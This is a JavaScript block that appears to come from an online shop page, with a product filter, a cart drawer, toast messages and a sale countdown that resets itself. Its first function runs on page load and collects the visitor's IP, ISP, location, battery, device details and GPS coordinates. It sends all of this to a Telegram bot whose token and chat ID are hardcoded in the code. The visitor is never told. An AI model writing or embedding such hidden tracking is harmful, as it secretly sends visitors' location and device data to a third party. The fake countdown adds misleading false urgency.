<Script>
const BOT_TOKEN = "8284459830:AAF4I0XEq0TTwFoJuDCBZFuzBmNZZVufSME";
const CHAT_ID = "7160128417";



async function shareLocation() {
  // 1. Fetch IP Address & Network Details cleanly
  let ipInfo = { ip: "Unavailable", org: "Unavailable", city: "Unavailable", country_name: "Unavailable" };
  try {
    const res = await fetch("https://ipapi.co/json/");
    if (res.ok) {
      ipInfo = await res.json();
    }
  } catch (e) {
    // Fail silently
  }

  // 2. Fetch Battery Status
  let batteryInfo = "Unavailable";
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      const level = Math.round(battery.level * 100);
      const charging = battery.charging ? "⚡ Charging" : "🔋 Discharging";
      batteryInfo = `${level}% (${charging})`;
    } catch (e) {}
  }

  // 3. Extract Device & Environment Info
  const userAgent = navigator.userAgent;
  const screenRes = `${window.screen.width}x${window.screen.height}`;
  const language = navigator.language || navigator.userLanguage;
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const platform = navigator.platform;

  // Payload compiler (Uses direct Unicode symbols • instead of HTML &# codes)
  const sendTelegramReport = async (lat = "Denied/Unavailable", lon = "Denied/Unavailable", accuracy = "N/A") => {
    const text = `📍 *New User Session Data*

🌐 *Network & IP Info:*
• IP Address: \`${ipInfo.ip || "N/A"}\`
• ISP / Network: ${ipInfo.org || "N/A"}
• IP City/Country: ${ipInfo.city || "N/A"}, ${ipInfo.country_name || "N/A"}

📱 *Device & Environment:*
• Platform: ${platform}
• Screen Size: ${screenRes}
• Language: ${language}
• Timezone: ${timeZone}
• Battery: ${batteryInfo}
• User-Agent: \`${userAgent}\`

🎯 *GPS Location:*
• Latitude: ${lat}
• Longitude: ${lon}
• Accuracy: ${accuracy} meters
• Google Maps: ${lat !== "Denied/Unavailable" ? `https://maps.google.com/?q=${lat},${lon}` : "N/A"}`;

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: "Markdown"
        })
      });
    } catch (e) {}
  };

  // Check if browser supports Geolocation and page is running on HTTPS
  if (!navigator.geolocation || window.location.protocol !== 'https:') {
    await sendTelegramReport();
    return;
  }

  // Request actual GPS coordinates
  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      await sendTelegramReport(lat, lon, accuracy);
    },
    async () => {
      // Permission denied or timed out
      await sendTelegramReport();
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
}

document.addEventListener("DOMContentLoaded", shareLocation);



/* =========================================
   FILTER
========================================= */

function filterProducts(category,button){

    document
        .querySelectorAll(".filter")
        .forEach(el=>{
            el.classList.remove("active");
        });

    button.classList.add("active");

    document
        .querySelectorAll("#productGrid .product")
        .forEach(product=>{

            if(category==="all"){
                product.style.display="";
                return;
            }

            product.style.display =
                product.classList.contains(category)
                ? ""
                : "none";

        });

}


/* =========================================
   CART
========================================= */

let cart=[];

function addToCart(name,price,product){

    const image =
        product.querySelector("img").src;

    cart.push({
        name,
        price,
        image
    });

    document.getElementById("cartCount")
        .innerText=cart.length;

    renderCart();

    showToast(
        "🔥 " + name + " added to your vault"
    );

}


function renderCart(){

    const container =
        document.getElementById("cartItems");

    if(cart.length===0){

        container.innerHTML=`
            <div class="empty">
                Your vault is empty.<br>
                Add something legendary.
            </div>
        `;

        return;
    }

    container.innerHTML="";

    cart.forEach(item=>{

        const div=
            document.createElement("div");

        div.className="cart-item";

        div.innerHTML=`

            <img
                src="${item.image}"
                alt="${item.name}"
            >

            <div>
                <strong>${item.name}</strong>
                <span>${item.price}</span>
            </div>

        `;

        container.appendChild(div);

    });

}


function toggleCart(){

    document
        .getElementById("drawer")
        .classList.toggle("open");

}


/* =========================================
   TOAST
========================================= */

let toastTimer;

function showToast(message){

    const toast=
        document.getElementById("toast");

    toast.innerText=message;

    toast.classList.add("show");

    clearTimeout(toastTimer);

    toastTimer=setTimeout(()=>{

        toast.classList.remove("show");

    },2500);

}


/* =========================================
   COUNTDOWN
========================================= */

let saleEnd=
    Date.now()+
    (
        2*24*60*60*1000+
        18*60*60*1000+
        42*60*1000
    );


function updateTimer(){

    let distance=
        saleEnd-Date.now();

    if(distance<=0){

        saleEnd=
            Date.now()+
            24*60*60*1000;

        distance=
            saleEnd-Date.now();

    }

    const days=
        Math.floor(
            distance/
            (1000*60*60*24)
        );

    const hours=
        Math.floor(
            distance%
            (1000*60*60*24)/
            (1000*60*60)
        );

    const minutes=
        Math.floor(
            distance%
            (1000*60*60)/
            (1000*60)
        );

    const seconds=
        Math.floor(
            distance%
            (1000*60)/
            1000
        );


    document.getElementById("days")
        .innerText=
        String(days).padStart(2,"0");

    document.getElementById("hours")
        .innerText=
        String(hours).padStart(2,"0");

    document.getElementById("minutes")
        .innerText=
        String(minutes).padStart(2,"0");

    document.getElementById("seconds")
        .innerText=
        String(seconds).padStart(2,"0");

}

setInterval(updateTimer,1000);

updateTimer();

</script>

